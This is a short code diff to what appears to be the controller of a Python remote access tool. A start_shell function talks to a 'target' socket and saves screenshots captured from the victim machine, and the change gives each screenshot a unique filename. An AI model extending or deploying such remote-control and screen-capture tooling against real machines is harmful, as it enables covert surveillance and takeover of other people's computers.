@@ -1,6 +1,7 @@
 import json
 import struct
 import base64
+import uuid
 def send_frame(target,data):
     prefix = struct.pack(">I", len(data))
     target.send(prefix)
@@ -66,7 +67,7 @@ def start_shell(target_socket,target_ip):
                 if file_data == "SCREENSHOT_FAIL":
                     print("Screenshot Failed")
                 else:
-                    with open("screenshot","wb") as f:
+                    with open("screenshot_"+uuid.uuid4().hex+".png","wb") as f:
                         f.write(base64.b64decode(file_data))
         except Exception as e:
             print(str(e))
